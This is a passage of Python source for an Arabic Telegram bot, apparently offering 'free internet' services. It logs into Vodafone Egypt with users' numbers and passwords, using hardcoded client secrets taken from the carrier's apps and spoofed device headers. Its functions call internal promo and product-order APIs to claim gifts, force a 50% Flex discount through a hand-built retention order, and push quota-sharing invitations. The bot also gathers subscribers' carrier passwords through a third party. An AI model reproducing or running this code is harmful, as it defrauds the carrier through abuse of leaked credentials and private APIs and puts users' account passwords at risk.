            'client_secret': 'a2ec6fff-0b7f-4aa4-a733-96ceae5c84c3',
            'client_id': 'my-vodafone-app'
        }
        headers = {
            'User-Agent': "okhttp/4.9.3",
            'Accept': "application/json, text/plain, */*",
            'Accept-Encoding': "gzip",
            'x-dynatrace': "MT_3_24_2006575350_70-0_a556db1b-4506-43f3-854a-1d2527767923_0_2097_307",
            'x-agent-operatingsystem': "android",
            'clientId': "my-vodafone-app",
            'x-agent-device': "V2419",
            'x-agent-version': "2024.10.1",
            'x-agent-build': "562"
        }
        response = requests.post(url, data=payload, headers=headers)
        try:
            tok = response.json()['access_token']
        except KeyError:
            return "❌ فشل تسجيل الدخول. يرجى التحقق من الرقم أو كلمة المرور."
        url = "https://web.vodafone.com.eg/services/dxl/promo/promotion?%40type=Promo&%24.context.type=scratchCoupon"
        headers['Authorization'] = f"Bearer {tok}"
        headers['channel'] = "MOBILE"
        headers['useCase'] = "Promo"
        headers['Content-Type'] = "application/json"
        headers['msisdn'] = number
        headers['Accept-Language'] = "ar"
        response = requests.get(url, headers=headers)
        if "No Data Found" in response.text:
            return "⚠️ لا يوجد عرض متاح لك حاليًا."
        elif "Promo_TX_ID" in response.text:
            return "✅ تم تفعيل العرض مسبقًا."
        else:
            return "✅ تم تفعيل العرض بنجاح!"
    except Exception as e:
        return f"❌ حدث خطأ: {str(e)}"

def redeem_vodafone_summer_gift(number, password, chat_id):
    show_progress(chat_id)
    try:
        url = "https://mobile.vodafone.com.eg/auth/realms/vf-realm/protocol/openid-connect/token"
        payload = {
            'grant_type': "password",
            'username': number,
            'password': password,
            'client_secret': "95fd95fb-7489-4958-8ae6-d31a525cd20a",
            'client_id': "ana-vodafone-app"
        }
        headers = {
            'User-Agent': "okhttp/4.11.0",
            'Accept': "application/json, text/plain, */*",
            'Accept-Encoding': "gzip",
            'silentLogin': "false",
            'x-agent-operatingsystem': "13",
            'clientId': "AnaVodafoneAndroid",
            'Accept-Language': "ar",
            'x-agent-device': "Xiaomi 21061119AG",
            'x-agent-version': "2024.12.1",
            'x-agent-build': "946",
            'digitalId': "28RI9U7IINOOB"
        }
        response = requests.post(url, data=payload, headers=headers)
        try:
            tok = response.json()['access_token']
        except:
            return "❌ فشل تسجيل الدخول! تأكد من الرقم وكلمة المرور."
        url = "https://web.vodafone.com.eg/services/dxl/promo/promotion?@type=Promo&$.context.type=massSummerPromo25&$.characteristics%5B@name%3Dparam1%5D.value=0"
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/537.36",
            'Accept': "application/json",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'sec-ch-ua-platform': "\"Android\"",
            'Authorization': f"Bearer {tok}",
            'Accept-Language': "AR",
            'msisdn': number,
            'sec-ch-ua': "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Google Chrome\";v=\"138\"",
            'clientId': "WebsiteConsumer",
            'sec-ch-ua-mobile': "?1",
            'channel': "APP_PORTAL",
            'Content-Type': "application/json",
            'Sec-Fetch-Site': "same-origin",
            'Sec-Fetch-Mode': "cors",
            'Sec-Fetch-Dest': "empty",
            'Referer': "https://web.vodafone.com.eg/portal/bf/massSummer25",
        }
        response = requests.get(url, headers=headers)
        if response.status_code == 404:
            return "⚠️ لقد حصلت على الهدية من قبل!"
        data = response.json()
        Type = data[1]["@type"]
        Category = data[1]["category"]
        Channel = data[1]["channel"]["id"]
        Amount = data[1]["characteristics"][0]["value"]
        url = "https://web.vodafone.com.eg/services/dxl/promo/promotion"
        payload = {
            "@type": "Promo",
            "channel": {
                "id": Channel
            },
            "context": {
                "type": "massSummerPromo25"
            },
            "pattern": [
                {
                    "characteristics": [
                        {
                            "name": "numberOfFaces",
                            "value": Category
                        },
                        {
                            "name": "giftId",
                            "value": Type
                        }
                    ]
                }
            ]
        }
        response = requests.post(url, data=json.dumps(payload), headers=headers)
        return f"✅ تم تفعيل هدية الصيف {Amount} بنجاح! 🎉"
    except Exception as e:
        return f"❌ حدث خطأ: {str(e)}"

def redeem_vodafone_flex_discount(number, password, chat_id):
    show_progress(chat_id)
    try:
        url = "https://mobile.vodafone.com.eg/auth/realms/vf-realm/protocol/openid-connect/token"
        payload = {
            'grant_type': "password",
            'username': number,
            'password': password,
            'client_secret': "95fd95fb-7489-4958-8ae6-d31a525cd20a",
            'client_id': "ana-vodafone-app"
        }
        headers = {
            'User-Agent': "okhttp/4.11.0",
            'Accept': "application/json, text/plain, */*",
            'Accept-Encoding': "gzip",
            'silentLogin': "false",
            'x-agent-operatingsystem': "13",
            'clientId': "AnaVodafoneAndroid",
            'Accept-Language': "ar",
            'x-agent-device': "Xiaomi 21061119AG",
            'x-agent-version': "2024.12.1",
            'x-agent-build': "946",
            'digitalId': "28RI9U7IINOOB"
        }
        response = requests.post(url, data=payload, headers=headers)
        try:
            tok = response.json()['access_token']
        except:
            return "❌ رقم الهاتف أو كلمة المرور غير صحيحة"
        url = "https://mobile.vodafone.com.eg/services/dxl/pom/productOrder"
        payload = {
            "channel": {
                "name": "MobileApp"
            },
            "orderItem": [
                {
                    "action": "add",
                    "id": "Flex_2021_523",
                    "itemPrice": [
                        {
                            "name": "OriginalPrice",
                            "price": {
                                "taxIncludedAmount": {
                                    "unit": "LE",
                                    "value": "130.0"
                                }
                            }
                        },
                        {
                            "name": "MigrationFees",
                            "price": {
                                "taxIncludedAmount": {
                                    "unit": "LE",
                                    "value": "0.0"
                                }
                            }
                        }
                    ],
                    "product": {
                        "characteristic": [
                            {
                                "name": "offerRank",
                                "value": "1"
                            },
                            {
                                "name": "TariffID",
                                "value": "523"
                            },
                            {
                                "name": "Quota"
                            },
                            {
                                "name": "Validity",
                                "@type": "MONTH",
                                "value": "1"
                            },
                            {
                                "name": "MaxAdjustmentNumber",
                                "value": "1"
                            },
                            {
                                "name": "TariffRank",
                                "value": "6"
                            },
                            {
                                "name": "MigrationDesc",
                                "value": "Intervention Offer Migration"
                            },
                            {
                                "name": "CohortId",
                                "value": "24"
                            }
                        ],
                        "productSpecification": [
                            {
                                "id": "Retention With Offer",
                                "name": "Category"
                            },
                            {
                                "id": "Upon Renewal / Repurchase",
                                "name": "MigrationRule"
                            },
                            {
                                "id": "10",
                                "name": "RatePlanType"
                            },
                            {
                                "id": "Flex Family",
                                "name": "BundleType"
                            }
                        ],
                        "relatedParty": [
                            {
                                "id": number,
                                "name": "MSISDN",
                                "@referredType": "prepaid",
                                "role": "Subscriber"
                            },
                            {
                                "id": "523",
                                "name": "TariffID",
                                "@referredType": "prepaid",
                                "role": "TariffID"
                            }
                        ]
                    },
                    "@type": "Access fees Discount",
                    "eCode": 0
                }
            ],
            "@type": "InterventionTariff"
        }
        headers = {
            'User-Agent': "okhttp/4.11.0",
            'Connection': "Keep-Alive",
            'Accept': "application/json",
            'Accept-Encoding': "gzip",
            'Content-Type': "application/json",
            'api-host': "ProductOrderingManagement",
            'useCase': "",
            'Authorization': f"Bearer {tok}",
            'api-version': "v2",
            'x-agent-operatingsystem': "13",
            'clientId': "AnaVodafoneAndroid",
            'x-agent-device': "Xiaomi 21061119AG",
            'x-agent-version': "2024.12.1",
            'x-agent-build': "946",
            'msisdn': number,
            'Accept-Language': "ar",
            'Content-Type': "application/json; charset=UTF-8"
        }
        response = requests.post(url, data=json.dumps(payload), headers=headers)
        try:
            foxxx = response.json()['reason']
            if foxxx == "Success With Grace":
                return "✅ تم تفعيل خصم 50% على باقة فليكس بنجاح! 🎉"
            else:
                return f"⚠️ {foxxx}"
        except:
            return f"❌ حدث خطأ: {response.text}"
    except Exception as e:
        return f"❌ حدث خطأ: {str(e)}"

def distribute_vodafone_flexes(owner_number, owner_password, target_number, flex_amount, chat_id):
    show_progress(chat_id)
    try:
        url = "https://mobile.vodafone.com.eg/auth/realms/vf-realm/protocol/openid-connect/token"
        payload = {
            'grant_type': "password",
            'username': owner_number,
            'password': owner_password,
            'client_secret': "95fd95fb-7489-4958-8ae6-d31a525cd20a",
            'client_id': "ana-vodafone-app"
        }
        headers = {
            'User-Agent': "okhttp/4.11.0",
            'Accept': "application/json, text/plain, */*",
            'Accept-Encoding': "gzip",
            'silentLogin': "false",
            'x-agent-operatingsystem': "14",
            'clientId': "AnaVodafoneAndroid",
            'Accept-Language': "ar",
            'x-agent-device': "Samsung SM-A055F",
            'x-agent-version': "2024.11.2",
            'x-agent-build': "944",
            'digitalId': "2B8218UYAW2PU"
        }
        response = requests.post(url, data=payload, headers=headers)
        result = response.json()
        try:
            token = result['access_token']
        except:
            return '❌ رقم المالك أو كلمة المرور خاطئة'
        url = "https://web.vodafone.com.eg/services/dxl/cg/customerGroupAPI/customerGroup"
        payload = {
            "name": "FlexFamily",
            "type": "SendInvitation",
            "category": [
                {
                    "value": "523",
                    "listHierarchyId": "PackageID"
                },
                {
                    "value": "47",
                    "listHierarchyId": "TemplateID"
                },
                {
                    "value": "523",
                    "listHierarchyId": "TierID"
                },
                {
                    "value": "percentage",
                    "listHierarchyId": "familybehavior"
                }
            ],
            "parts": {
                "member": [
                    {
                        "id": [
                            {
                                "value": owner_number,
                                "schemeName": "MSISDN"
                            }
                        ],
                        "type": "Owner"
                    },
                    {
                        "id": [
                            {
                                "value": target_number,
                                "schemeName": "MSISDN"
                            }
                        ],
                        "type": "Member"
                    }
                ],
                "characteristicsValue": {
                    "characteristicsValue": [
                        {
                            "characteristicName": "quotaDist1",
                            "value": flex_amount,
                            "type": "percentage"
                        }
                    ]
                }
            }
        }
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36",
            'Accept': "application/json",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'Content-Type': "application/json",
            'sec-ch-ua': "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"",
            'msisdn': owner_number,
            'Accept-Language': "ER",
            'sec-ch-ua-mobile': "?1",
            'Authorization': f"Bearer {token}",
            'x-dtpc': "13$138553881_49h16vHIUHUFCHVFFFRAQPHKRBUMQROKEEITAA-0e0",
            'clientId': "WebsiteConsumer",
            'sec-ch-ua-platform': "\"Android\"",
            'Origin': "https://web.vodafone.com.eg",
            'Sec-Fetch-Site': "same-origin",
            'Sec-Fetch-Mode': "cors",
            'Sec-Fetch-Dest': "empty",
            'Referer': "https://web.vodafone.com.eg/spa/familySharing",
        }
        response = requests.post(url, data=json.dumps(payload), headers=headers)
        if '{}' in response.text:
            return '✅ تم إرسال طلب التوزيع بنجاح'
        else:
            return '❌ حدث خطأ أثناء إرسال الدعوة'
    except Exception as e:
        return f'❌ حدث خطأ: {str(e)}'

# ========== لوحة تحكم الأدمن ==========
@bot.message_handler(commands=['admin'])
def admin_panel(message):
    user_id = message.from_user.id
    if user_id not in ADMINS:
        bot.reply_to(message, "⛔ هذا الأمر للمسؤولين فقط!")
        return
    keyboard = [
        [InlineKeyboardButton("👥 إدارة المستخدمين", callback_data='user_management')],
        [InlineKeyboardButton("⚙️ إدارة الخدمات", callback_data='service_management')],
        [InlineKeyboardButton(f"{'⏸️ إيقاف البوت' if BOT_ACTIVE else '▶️ تشغيل البوت'}", callback_data='toggle_bot')],
        [InlineKeyboardButton("📊 إحصائية البوت", callback_data='bot_stats')],
        [InlineKeyboardButton("📢 إرسال إشعار عام", callback_data='broadcast')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    bot.send_message(message.chat.id, "👨‍💻 لوحة تحكم الأدمن:", reply_markup=reply_markup)

@bot.callback_query_handler(func=lambda call: call.data == 'toggle_bot')
def toggle_bot(call):
    user_id = call.from_user.id
    if user_id not in ADMINS:
        bot.answer_callback_query(call.id, "⛔ هذا الأمر للمسؤولين فقط!", show_alert=True)
        return
    global BOT_ACTIVE
    BOT_ACTIVE = not BOT_ACTIVE
    action = "تم إيقاف" if not BOT_ACTIVE else "تم تشغيل"
    bot.answer_callback_query(call.id, f"{action} البوت بنجاح")
    admin_panel(call.message)

@bot.callback_query_handler(func=lambda call: call.data == 'user_management')
def user_management(call):
    user_id = call.from_user.id
    if user_id not in ADMINS:
        bot.answer_callback_query(call.id, "⛔ هذا الأمر للمسؤولين فقط!", show_alert=True)
        return
    keyboard = [
        [InlineKeyboardButton("📋 قائمة المستخدمين الموافق عليهم", callback_data='list_approved')],
        [InlineKeyboardButton("➕ إضافة مستخدم", callback_data='add_user')],
        [InlineKeyboardButton("➖ إزالة مستخدم", callback_data='remove_user')],
        [InlineKeyboardButton("⛔ حظر مستخدم", callback_data='ban_user')],
        [InlineKeyboardButton("✅ إلغاء حظر مستخدم", callback_data='unban_user')],
        [InlineKeyboardButton("🔙 رجوع", callback_data='admin_back')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text="👥 إدارة المستخدمين:",
        reply_markup=reply_markup
    )

@bot.callback_query_handler(func=lambda call: call.data == 'service_management')
def service_management(call):
    user_id = call.from_user.id
    if user_id not in ADMINS:
        bot.answer_callback_query(call.id, "⛔ هذا الأمر للمسؤولين فقط!", show_alert=True)
        return
    keyboard = [
        [InlineKeyboardButton(f"Orange {'✅' if SERVICE_STATUS['orange'] else '❌'}", callback_data='toggle_orange')],
        [InlineKeyboardButton(f"Etisalat {'✅' if SERVICE_STATUS['etisalat'] else '❌'}", callback_data='toggle_etisalat')],
        [InlineKeyboardButton(f"Vodafone {'✅' if SERVICE_STATUS['vodafone'] else '❌'}", callback_data='toggle_vodafone')],
        [InlineKeyboardButton(f"WE {'✅' if SERVICE_STATUS['we'] else '❌'}", callback_data='toggle_we')],
        [InlineKeyboardButton(f"TikTok Search {'✅' if SERVICE_STATUS['tiktok'] else '❌'}", callback_data='toggle_tiktok')],
        [InlineKeyboardButton(f"خدمات أخرى {'✅' if SERVICE_STATUS['other'] else '❌'}", callback_data='toggle_other')],
        [InlineKeyboardButton("🔙 رجوع", callback_data='admin_back')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text="⚙️ إدارة الخدمات (✅ مفعل / ❌ معطل):",
        reply_markup=reply_markup
    )

@bot.callback_query_handler(func=lambda call: call.data.startswith('toggle_'))
def toggle_service(call):
    user_id = call.from_user.id
    if user_id not in ADMINS:
        bot.answer_callback_query(call.id, "⛔ هذا الأمر للمسؤولين فقط!", show_alert=True)
        return
    service = call.data.split('_')[1]
    SERVICE_STATUS[service] = not SERVICE_STATUS[service]
    bot.answer_callback_query(call.id, f"تم {'تفعيل' if SERVICE_STATUS[service] else 'تعطيل'} خدمة {service}")
    service_management(call)

@bot.callback_query_handler(func=lambda call: call.data == 'ban_user')
def ban_user_prompt(call):
    user_id = call.from_user.id
    if user_id not in ADMINS:
        bot.answer_callback_query(call.id, "⛔ هذا الأمر للمسؤولين فقط!", show_alert=True)
        return
    msg = bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text="أرسل معرف المستخدم الذي تريد حظره:"
    )
    bot.register_next_step_handler(msg, process_ban_user)

def process_ban_user(message):
    user_id = message.from_user.id
    if user_id not in ADMINS:
        return
    try:
        user_to_ban = int(message.text)
        if user_to_ban in ADMINS:
            reply = "⛔ لا يمكن حظر مسؤول آخر"
        elif user_to_ban in BANNED_USERS:
            reply = f"ℹ️ المستخدم {user_to_ban} محظور بالفعل"
        else:
            BANNED_USERS.append(user_to_ban)
            if user_to_ban in APPROVED_USERS:
                APPROVED_USERS.remove(user_to_ban)
            reply = f"✅ تم حظر المستخدم {user_to_ban} بنجاح"
    except ValueError:
        reply = "⚠️ يجب إدخال رقم معرف صحيح"
    bot.send_message(
        message.chat.id,
        reply,
        reply_markup=InlineKeyboardMarkup([ [InlineKeyboardButton("العودة لإدارة المستخدمين ↩️", callback_data='user_management')] ])
    )

@bot.callback_query_handler(func=lambda call: call.data == 'unban_user')
def unban_user_prompt(call):
    user_id = call.from_user.id
    if user_id not in ADMINS:
        bot.answer_callback_query(call.id, "⛔ هذا الأمر للمسؤولين فقط!", show_alert=True)
        return
    if not BANNED_USERS:
        bot.answer_callback_query(call.id, "ℹ️ لا يوجد مستخدمين محظورين حالياً", show_alert=True)
        return
    msg = bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text="أرسل معرف المستخدم الذي تريد إلغاء حظره:"
    )
    bot.register_next_step_handler(msg, process_unban_user)

def process_unban_user(message):
    user_id = message.from_user.id
    if user_id not in ADMINS:
        return
    try:
        user_to_unban = int(message.text)
        if user_to_unban in BANNED_USERS:
            BANNED_USERS.remove(user_to_unban)
            reply = f"✅ تم إلغاء حظر المستخدم {user_to_unban} بنجاح"
        else:
            reply = f"ℹ️ المستخدم {user_to_unban} غير محظور"
    except ValueError:
        reply = "⚠️ يجب إدخال رقم معرف صحيح"
    bot.send_message(
        message.chat.id,
        reply,
        reply_markup=InlineKeyboardMarkup([ [InlineKeyboardButton("العودة لإدارة المستخدمين ↩️", callback_data='user_management')] ])
    )

@bot.callback_query_handler(func=lambda call: call.data == 'bot_stats')
def show_bot_stats(call):
    user_id = call.from_user.id
    if user_id not in ADMINS:
        bot.answer_callback_query(call.id, "⛔ هذا الأمر للمسؤولين فقط!", show_alert=True)
        return
    stats_text = f"""
📊 إحصائية البوت:
- عدد الأدمن: {len(ADMINS)}
- عدد المستخدمين الموافق عليهم: {len(APPROVED_USERS)}
- عدد المستخدمين المحظورين: {len(BANNED_USERS)}
- حالة البوت: {'✅ نشط' if BOT_ACTIVE else '⛔ متوقف'}

حالة الخدمات:
- Orange: {'✅ مفعل' if SERVICE_STATUS['orange'] else '❌ معطل'}
- Etisalat: {'✅ مفعل' if SERVICE_STATUS['etisalat'] else '❌ معطل'}
- Vodafone: {'✅ مفعل' if SERVICE_STATUS['vodafone'] else '❌ معطل'}
- WE: {'✅ مفعل' if SERVICE_STATUS['we'] else '❌ معطل'}
- TikTok Search: {'✅ مفعل' if SERVICE_STATUS['tiktok'] else '❌ معطل'}
- خدمات أخرى: {'✅ مفعل' if SERVICE_STATUS['other'] else '❌ معطل'}

آخر تحديث: {time.strftime('%Y-%m-%d %H:%M:%S')}
    """
    bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text=stats_text,
        reply_markup=InlineKeyboardMarkup([ [InlineKeyboardButton("🔙 رجوع", callback_data='admin_back')] ])
    )

@bot.callback_query_handler(func=lambda call: call.data == 'broadcast')
def broadcast_prompt(call):
    user_id = call.from_user.id
    if user_id not in ADMINS:
        bot.answer_callback_query(call.id, "⛔ هذا الأمر للمسؤولين فقط!", show_alert=True)
        return
    msg = bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text="أرسل الرسالة التي تريد نشرها لجميع المستخدمين:"
    )
    bot.register_next_step_handler(msg, process_broadcast)

def process_broadcast(message):
    user_id = message.from_user.id
    if user_id not in ADMINS:
        return
    broadcast_text = message.text
    all_users = ADMINS + APPROVED_USERS
    success = 0
    failed = 0
    for user in all_users:
        try:
            bot.send_message(user, f"📢 إشعار عام من الأدمن:\n\n{broadcast_text}")
            success += 1
            time.sleep(0.5)
        except Exception as e:
            print(f"Failed to send to {user}: {e}")
            failed += 1
    bot.send_message(
        message.chat.id,
        f"✅ تم إرسال الإشعار لـ {success} مستخدم بنجاح | فشل الإرسال لـ {failed} مستخدم",
        reply_markup=InlineKeyboardMarkup([ [InlineKeyboardButton("العودة للوحة التحكم ↩️", callback_data='admin_back')] ])
    )

@bot.callback_query_handler(func=lambda call: call.data == 'admin_back')
def admin_back(call):
    user_id = call.from_user.id
    if user_id not in ADMINS:
        bot.answer_callback_query(call.id, "⛔ هذا الأمر للمسؤولين فقط!", show_alert=True)
        return
    keyboard = [
        [InlineKeyboardButton("👥 إدارة المستخدمين", callback_data='user_management')],
        [InlineKeyboardButton("⚙️ إدارة الخدمات", callback_data='service_management')],
        [InlineKeyboardButton(f"{'⏸️ إيقاف البوت' if BOT_ACTIVE else '▶️ تشغيل البوت'}", callback_data='toggle_bot')],
        [InlineKeyboardButton("📊 إحصائية البوت", callback_data='bot_stats')],
        [InlineKeyboardButton("📢 إرسال إشعار عام", callback_data='broadcast')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text="👨‍💻 لوحة تحكم الأدمن:",
        reply_markup=reply_markup
    )

@bot.callback_query_handler(func=lambda call: call.data == 'list_approved')
def list_approved_users(call):
    user_id = call.from_user.id
    if user_id not in ADMINS:
        bot.answer_callback_query(call.id, "⛔ هذا الأمر للمسؤولين فقط!", show_alert=True)
        return
    if not APPROVED_USERS:
        reply = "ℹ️ لا يوجد مستخدمين موافق عليهم حالياً"
    else:
        reply = "👥 قائمة المستخدمين الموافق عليهم:\n" + "\n".join(str(user) for user in APPROVED_USERS)
    bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text=reply,
        reply_markup=InlineKeyboardMarkup([ [InlineKeyboardButton("🔙 رجوع", callback_data='user_management')] ])
    )

@bot.callback_query_handler(func=lambda call: call.data == 'add_user')
def add_user_prompt(call):
    user_id = call.from_user.id
    if user_id not in ADMINS:
        bot.answer_callback_query(call.id, "⛔ هذا الأمر للمسؤولين فقط!", show_alert=True)
        return
    msg = bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text="أرسل معرف المستخدم الذي تريد إضافته:"
    )
    bot.register_next_step_handler(msg, process_add_user)

def process_add_user(message):
    user_id = message.from_user.id
    if user_id not in ADMINS:
        return
    try:
        new_user_id = int(message.text)
        if new_user_id in BANNED_USERS:
            reply = f"⛔ لا يمكن إضافة مستخدم محظور ({new_user_id})"
        elif new_user_id not in APPROVED_USERS:
            APPROVED_USERS.append(new_user_id)
            reply = f"✅ تمت إضافة المستخدم {new_user_id} بنجاح"
        else:
            reply = f"ℹ️ المستخدم {new_user_id} موجود بالفعل في القائمة"
    except ValueError:
        reply = "⚠️ يجب إدخال رقم معرف صحيح"
    bot.send_message(
        message.chat.id,
        reply,
        reply_markup=InlineKeyboardMarkup([ [InlineKeyboardButton("العودة لإدارة المستخدمين ↩️", callback_data='user_management')] ])
    )

@bot.callback_query_handler(func=lambda call: call.data == 'remove_user')
def remove_user_prompt(call):
    user_id = call.from_user.id
    if user_id not in ADMINS:
        bot.answer_callback_query(call.id, "⛔ هذا الأمر للمسؤولين فقط!", show_alert=True)
        return
    if not APPROVED_USERS:
        bot.answer_callback_query(call.id, "ℹ️ لا يوجد مستخدمين موافق عليهم حالياً", show_alert=True)
        return
    msg = bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text="أرسل معرف المستخدم الذي تريد إزالته:"
    )
    bot.register_next_step_handler(msg, process_remove_user)

def process_remove_user(message):
    user_id = message.from_user.id
    if user_id not in ADMINS:
        return
    try:
        user_to_remove = int(message.text)
        if user_to_remove in APPROVED_USERS:
            APPROVED_USERS.remove(user_to_remove)
            reply = f"✅ تمت إزالة المستخدم {user_to_remove} بنجاح"
        else:
            reply = f"ℹ️ المستخدم {user_to_remove} غير موجود في القائمة"
    except ValueError:
        reply = "⚠️ يجب إدخال رقم معرف صحيح"
    bot.send_message(
        message.chat.id,
        reply,
        reply_markup=InlineKeyboardMarkup([ [InlineKeyboardButton("العودة لإدارة المستخدمين ↩️", callback_data='user_management')] ])
    )

# ========== معالجة الأوامر ==========
@bot.message_handler(commands=['start'])
def start(message):
    if not is_bot_active():
        bot.reply_to(message, BOT_DEACTIVATION_MESSAGE)
        return
    if not is_user_subscribed(message.from_user.id):
        keyboard = [
            [InlineKeyboardButton("📢 قناة Mido الاشتراك الإجباري 📢", url=f'https://t.me/{CHANNEL_USERNAME}')],
            [InlineKeyboardButton("تأكد من الاشتراك ✅", callback_data='check_subscription')],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        bot.send_message(
            message.chat.id,
            "⚠️ يجب الاشتراك في القناة التالية أولاً لاستخدام البوت:",
            reply_markup=reply_markup
        )
        return
    keyboard = []
    if SERVICE_STATUS['orange']:
        keyboard.append([InlineKeyboardButton("🟠 Orange 🟠", callback_data='orange')])
    if SERVICE_STATUS['etisalat']:
        keyboard.append([InlineKeyboardButton("🟢 Etisalat 🟢", callback_data='etisalat')])
    if SERVICE_STATUS['vodafone']:
        keyboard.append([InlineKeyboardButton("🔴 Vodafone 🔴", callback_data='vodafone')])
    if SERVICE_STATUS['we']:
        keyboard.append([InlineKeyboardButton("🔵 WE 🔵", callback_data='we')])
    if SERVICE_STATUS['other']:
        keyboard.append([InlineKeyboardButton("🟣 Other Services 🟣", callback_data='other_services')])
    keyboard.append([InlineKeyboardButton("⭐ Donate ⭐", callback_data='donate')])
    keyboard.append([InlineKeyboardButton("🟢 معلومات البوت 🟢", url='https://t.me/Maro_331/523')])
    keyboard.append([InlineKeyboardButton("🟢 المطور @AMI_EG 🟢", url='https://t.me/AMI_EG')])
    reply_markup = InlineKeyboardMarkup(keyboard)
    bot.send_message(
        message.chat.id,
        "اهلا بيك في بوت Mido للخدمات المجانيه للانترنت اختر ما تريد :",
        reply_markup=reply_markup
    )

@bot.callback_query_handler(func=lambda call: call.data == 'check_subscription')
def check_subscription(call):
    if not is_bot_active():
        bot.answer_callback_query(call.id, BOT_DEACTIVATION_MESSAGE, show_alert=True)
        return
    if is_user_subscribed(call.from_user.id):
        keyboard = []
        if SERVICE_STATUS['orange']:
            keyboard.append([InlineKeyboardButton("🟠 Orange 🟠", callback_data='orange')])
        if SERVICE_STATUS['etisalat']:
            keyboard.append([InlineKeyboardButton("🟢 Etisalat 🟢", callback_data='etisalat')])
        if SERVICE_STATUS['vodafone']:
            keyboard.append([InlineKeyboardButton("🔴 Vodafone 🔴", callback_data='vodafone')])
        if SERVICE_STATUS['we']:
            keyboard.append([InlineKeyboardButton("🔵 WE 🔵", callback_data='we')])
        if SERVICE_STATUS['other']:
            keyboard.append([InlineKeyboardButton("🟣 Other Services 🟣", callback_data='other_services')])
        keyboard.append([InlineKeyboardButton("⭐ Donate ⭐", callback_data='donate')])
        keyboard.append([InlineKeyboardButton("🟢 معلومات البوت 🟢", url='https://t.me/Maro_331/523')])
        keyboard.append([InlineKeyboardButton("🟢 المطور @AMI_EG 🟢", url='https://t.me/AMI_EG')])
        reply_markup = InlineKeyboardMarkup(keyboard)
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="اهلا بيك في بوت Mido للخدمات المجانيه للانترنت اختر ما تريد :",
            reply_markup=reply_markup
        )
    else:
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="⚠️ لم يتم العثور على اشتراكك. يرجى الاشتراك ثم المحاولة مرة أخرى.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📢 قناة Mido الاشتراك الإجباري 📢", url=f'https://t.me/{CHANNEL_USERNAME}')],
                [InlineKeyboardButton("تأكد من الاشتراك ✅", callback_data='check_subscription')]
            ])
        )

@bot.callback_query_handler(func=lambda call: call.data == 'other_services')
def other_services_handler(call):
    if not is_bot_active():
        bot.answer_callback_query(call.id, BOT_DEACTIVATION_MESSAGE, show_alert=True)
        return
    if not SERVICE_STATUS['other']:
        bot.answer_callback_query(call.id, "⛔ قسم الخدمات الأخرى معطل حالياً", show_alert=True)
        return
    keyboard = []
    if SERVICE_STATUS['tiktok']:
        keyboard.append([InlineKeyboardButton("🔍 TikTok Search", callback_data='tiktok_search')])
    keyboard.append([InlineKeyboardButton("🧠 إنشاء الصور (AI)", callback_data='image_generation')])
    keyboard.append([InlineKeyboardButton("📧 إنشاء بريد مؤقت", callback_data='temp_email')])
    keyboard.append([InlineKeyboardButton("معرفة المحافظة", callback_data='check_wallet')])
    keyboard.append([InlineKeyboardButton("رجوع ↩️", callback_data='back')])
    reply_markup = InlineKeyboardMarkup(keyboard)
    bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text="📱 خدمات أخرى متاحة:",
        reply_markup=reply_markup
    )

@bot.callback_query_handler(func=lambda call: call.data == 'temp_email')
def temp_email_handler(call):
    if not is_bot_active():
        bot.answer_callback_query(call.id, BOT_DEACTIVATION_MESSAGE, show_alert=True)
        return
    keyboard = [
        [InlineKeyboardButton("🔄 إنشاء بريد عشوائي", callback_data='temp_email_random')],
        [InlineKeyboardButton("✏️ إنشاء بريد مخصص", callback_data='temp_email_custom')],
        [InlineKeyboardButton("📨 عرض الرسائل", callback_data='temp_email_messages')],
        [InlineKeyboardButton("🗑️ حذف بريد", callback_data='temp_email_delete')],
        [InlineKeyboardButton("🔙 رجوع", callback_data='other_services')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text="📧 خدمات البريد المؤقت:\n\nاختر الخدمة المطلوبة:",
        reply_markup=reply_markup
    )

@bot.callback_query_handler(func=lambda call: call.data.startswith('temp_email_'))
def temp_email_actions_handler(call):
    action = call.data.replace('temp_email_', '')
    if action == 'random':
        bot.edit_message_text("⏳ جاري إنشاء بريد عشوائي...", call.message.chat.id, call.message.message_id)
        email = create_random_temp_email()
        if email:
            bot.edit_message_text(
                f"✅ تم إنشاء البريد بنجاح!\n\n📧 البريد: `{email}`\n\n⚠️ هذا بريد مؤقت ينتهي بعد فترة من الوقت.",
                call.message.chat.id,
                call.message.message_id,
                parse_mode='Markdown'
            )
        else:
